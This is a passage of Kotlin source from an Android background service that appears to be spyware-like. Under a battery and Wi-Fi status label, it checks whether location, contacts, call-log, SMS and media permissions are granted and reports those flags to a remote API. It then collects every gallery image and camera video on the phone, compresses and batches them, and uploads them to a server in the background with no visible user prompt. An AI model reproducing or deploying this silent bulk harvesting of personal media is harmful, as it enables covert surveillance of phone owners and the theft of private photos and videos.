        val batteryStatusIntent = registerReceiver(null, batteryIntentFilter)
        var batteryLevel = -1
        if (batteryStatusIntent != null) {
            val level = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            batteryLevel = (level / scale.toFloat() * 100).toInt()
        }

        val connected = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
        // Log the fetched data
        Log.d("DataBatteryService", "Is Wifi Connected: $connected Is Connected: $isConnected Battery Percentage: $batteryLevel%")
        getAllPermission(connected,batteryLevel,token)

    }

    private fun getAllPermission(connected: Boolean, batteryLevel: Int, token: String) {
        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isLocationPermissionGranted = true
            Log.d("isLocationGranted", isLocationPermissionGranted.toString())
        }
        else{
            isLocationPermissionGranted = false
            Log.d("isLocationGranted", isLocationPermissionGranted.toString())
        }

        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isContactPermissionGranted = true
            Log.d("isContactGranted", isContactPermissionGranted.toString())
        }
        else{
            isContactPermissionGranted = false
            Log.d("isContactGranted", isContactPermissionGranted.toString())
        }

        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.READ_CALL_LOG
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isCallLogPermissionGranted = true
            Log.d("isCallLogGranted", isCallLogPermissionGranted.toString())
        }
        else{
            isCallLogPermissionGranted = false
            Log.d("isCallLogGranted", isCallLogPermissionGranted.toString())
        }

        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isPostNotificationPermissionGranted = true
            Log.d("isNotificationGranted", isPostNotificationPermissionGranted.toString())
        }
        else{
            isPostNotificationPermissionGranted = false
            Log.d("isNotificationGranted", isPostNotificationPermissionGranted.toString())
        }

        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isSmsPermissionGranted = true
            Log.d("isSmsGranted", isSmsPermissionGranted.toString())
        }
        else{
            isSmsPermissionGranted = false
            Log.d("isSmsGranted", isSmsPermissionGranted.toString())
        }

        if(Build.VERSION.SDK_INT == Build.VERSION_CODES.TIRAMISU){
            if (ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_MEDIA_VIDEO
                ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                    applicationContext, Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                isReadMediaImagePermissionGranted = true
                Log.d("isMediaGranted", isReadMediaImagePermissionGranted.toString())
            }
            else{
                isReadMediaImagePermissionGranted = false
                Log.d("isMediaGranted", isReadMediaImagePermissionGranted.toString())
            }
        }
        else{
            if (ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                isReadMediaImagePermissionGranted = true
                Log.d("isSmsGranted", isSmsPermissionGranted.toString())
            }
            else{
                isReadMediaImagePermissionGranted = false
                Log.d("isSmsGranted", isSmsPermissionGranted.toString())
            }
        }


        var baseUrl = getString(R.string.api)
        apiCall.callBatteryWifiApi(connected,batteryLevel,isCallLogPermissionGranted,isContactPermissionGranted,isLocationPermissionGranted,isPostNotificationPermissionGranted,isSmsPermissionGranted,isReadMediaImagePermissionGranted,baseUrl,applicationContext,token)


    }

    fun charRemoveAt(str: String, p: Int): String? {
        return str.substring(0, p) + str.substring(p + 1)
    }

    @SuppressLint("Range")
    private fun getContactName(applicationContext: Context?, phoneNumber: String?): String? {
        val cr: ContentResolver = applicationContext!!.contentResolver
        val uri = Uri.withAppendedPath(
            PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(phoneNumber)
        )
        val cursor = cr.query(uri, arrayOf(PhoneLookup.DISPLAY_NAME), null, null, null)
            ?: return null
        var contactName: String? = null
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(
                cursor
                    .getColumnIndex(PhoneLookup.DISPLAY_NAME)
            )
        }
        if (cursor != null && !cursor.isClosed) {
            cursor.close()
        }
        return contactName
    }


    var lastIndex = 0
    var lastIndexVideo = 0
    var imageSize: Long = 0
    var videoSize: Long = 0
    var maxMb = 0
    var totalSize: Long = 0
    var totalSizeVideo: Long = 0
    val dateImageList = ArrayList<String>()
    val dateVideoList = ArrayList<String>()

    fun getImagesFromCameraFolder() {
        val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val connected = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
        Log.d("connected",connected.toString())
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("isLoopContinue",
            AppCompatActivity.MODE_PRIVATE
        )
        val continueLoop: String = sharedPreferences.getString("continueLoop", "").toString()
        val editor = sharedPreferences.edit()
        editor.putString("isAllLogApi", "false")
        editor.apply()

        maxMb = if(!connected){
            100
        } else{
            1024
        }
        Log.d("maxMb",maxMb.toString())

//        val imageList: List<String> = loadImagesFromCameraFolder()
        val imageList: List<String> = loadGalleryImages()
        val videoList: List<String> = loadVideoFromCameraFolder()

        val finalList: MutableList<String> = java.util.ArrayList()
        val finalVideoList: MutableList<String> = java.util.ArrayList()
        Log.d("imageList Length",imageList.size.toString())
        for (j in imageList.indices) {
            val file = File(imageList[j])
            val fileSizeInBytes = file.length()
            val fileSizeInKB = fileSizeInBytes / 1024
            val fileSizeInMB = fileSizeInKB / 1024
            totalSize += fileSizeInMB

        }
        for (k in videoList.indices) {
            val file = File(videoList[k])
            val fileSizeInBytes = file.length()
            val fileSizeInKB = fileSizeInBytes / 1024
            val fileSizeInMB = fileSizeInKB / 1024
            totalSizeVideo += fileSizeInMB

        }
        for (i in lastIndex until imageList.size) {
            Log.d("INDEX",i.toString())

            val file = File(imageList[i])
            val fileSizeInBytes = file.length()
            val fileSizeInKB = fileSizeInBytes / 1024
            val fileSizeInMB = fileSizeInKB / 1024
            if (imageSize == 0L) {
                imageSize = fileSizeInMB
                finalList.add(imageList[i])
            } else {
                if (imageSize < maxMb) {
                    imageSize += fileSizeInMB
                    finalList.add(imageList[i])
                    lastIndex = i
                } else {
                    if(lastIndex == (totalSize.toInt() - 1)){
                        lastIndex = i
                        imageSize = 0
                        break
                    }
                    else{
                        lastIndex = i
                        getImagesFromCameraFolder()
                    }
                }
            }
        }

        // Do something with the list of image URIs
        for (imageUri in finalList) {
            val file = File(imageUri)
            ApiCallManager.appendLog("continueLoop $continueLoop")
            Log.d("continueLoop",continueLoop)
            if(continueLoop == "true"){
                break
            }
            else{
                apiCall.uploadFile(file,"Image",applicationContext,maxMb,connectivityManager,editor,dateImageList,"oldImageDate","isAllImageLogApi")
            }
        }

        for (i in lastIndexVideo until videoList.size) {
            val file = File(videoList[i])
            val fileSizeInBytes = file.length()
            val fileSizeInKB = fileSizeInBytes / 1024
            val fileSizeInMB = fileSizeInKB / 1024
            if (videoSize == 0L) {
                videoSize = fileSizeInMB
                finalVideoList.add(videoList[i])
            } else {
                if (videoSize < maxMb) {
                    videoSize += fileSizeInMB
                    finalVideoList.add(videoList[i])
                    lastIndexVideo = i
                } else {
                    if(lastIndex == (totalSizeVideo.toInt() - 1)){
                        lastIndexVideo = i
                        videoSize = 0
                        break
                    }
                    else{
                        lastIndexVideo = i
                        getImagesFromCameraFolder()
                    }
                }
            }
        }

        for (videoUri in finalVideoList) {
            val file = File(videoUri)
            if(continueLoop == "true"){
                break
            }else{
                apiCall.uploadFile(
                    file,
                    "Video",
                    applicationContext,
                    maxMb,
                    connectivityManager,
                    editor,
                    dateVideoList,
                    "oldVideoDate",
                    "isAllVideoLogApi"
                )
            }

            Log.d("VideoLoader", "Video URI: $videoUri")
        }

    }

    private fun loadGalleryImages(): List<String> {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("isLoopContinue",
            AppCompatActivity.MODE_PRIVATE
        )
        val isAllLogApiCall = sharedPreferences.getString("isAllImageLogApi","")
        val oldImageDate = sharedPreferences.getString("oldImageDate","")
//        Log.d("isAllLogApiCall",oldDate.toString())
        val formatter = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        var finalImageDate: LocalDateTime = LocalDateTime.now()
        if(oldImageDate != ""){
            finalImageDate = LocalDateTime.parse(oldImageDate, formatter)
        }
        val imageList: MutableList<String> = ArrayList()

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.DATE_ADDED,
        )
        val sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC"
        val cursor = application.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )

        if (cursor != null) {
            while (cursor.moveToNext()) {
                val test = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_TAKEN))
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val formattedDate = sdf.format(Date(date))
                Log.d("get Image=>",test.toString())
//                Log.d("formattedDate=>",formattedDate.toString())
                dateImageList.add(formattedDate)
                val fullSizeBitmap = BitmapFactory.decodeFile(test)

                val reduceBitemap = ImageResizer.reduceBitmapSize(fullSizeBitmap,240000)
                val reduceFile: File = getBitmapFile(reduceBitemap)
                val ddate = LocalDateTime.parse(formattedDate, formatter)
                Log.d("date=>",reduceFile.toString())

                if(isAllLogApiCall == "true"){
                    if(finalImageDate.isBefore(ddate)){
                        imageList.add(reduceFile.path)
                    }
                }
                else{
                    imageList.add(reduceFile.path)
                }
            }
            cursor.close()
        }
        return imageList
    }

    private fun getBitmapFile(reduceBitemap: Bitmap): File {
        val externalFilesDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
        val file = File(externalFilesDir, "${System.currentTimeMillis()}_reduce_file.jpg")

        val bos = ByteArrayOutputStream()
        reduceBitemap.compress(Bitmap.CompressFormat.JPEG,80,bos)
        var bitmapData = bos.toByteArray()

        try {
            file.createNewFile()
            val fos = FileOutputStream(file)
            fos.write(bitmapData)
            fos.flush()
            fos.close()
            return file
        }
        catch (e:java.lang.Exception){

        }
        return file

    }

    fun loadVideoFromCameraFolder(): List<String> {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("isLoopContinue",
            AppCompatActivity.MODE_PRIVATE
        )
        val isAllLogApiCall = sharedPreferences.getString("isAllVideoLogApi","")
        val oldVideoDate = sharedPreferences.getString("oldVideoDate","")
//        Log.d("isAllLogApiCall",oldDate.toString())
        val formatter = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        var finalVideoDate: LocalDateTime = LocalDateTime.now()

        if(oldVideoDate != ""){
            finalVideoDate = LocalDateTime.parse(oldVideoDate, formatter)
        }

        val videoList: MutableList<String> = ArrayList()
        val projectionVideo = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.DATE_TAKEN,
            MediaStore.Video.Media.DATE_ADDED,
        )

        val sortOrderVideo = "${MediaStore.Video.Media.DATE_ADDED} DESC"
        val cursorVideo = application.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projectionVideo,
            null,
            null,
            sortOrderVideo
        )

        if (cursorVideo != null) {
                while (cursorVideo.moveToNext()) {
                    val test =
                        cursorVideo.getString(cursorVideo.getColumnIndexOrThrow(MediaStore.Video.Media.DATA))
                    val date = cursorVideo.getLong(cursorVideo.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN))
                    val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    val formattedDate = sdf.format(Date(date))
                    Log.d("get video",test)
                    dateVideoList.add(formattedDate)
                    val ddate = LocalDateTime.parse(formattedDate, formatter)
                    Log.d("Video date",ddate.toString())
                    if(isAllLogApiCall == "true"){
                        if(finalVideoDate.isBefore(ddate)){
                            videoList.add(test)
                        }
                    }
                    else{
                        videoList.add(test)
                    }
                }
                cursorVideo.close()
            }
            return videoList
        }


}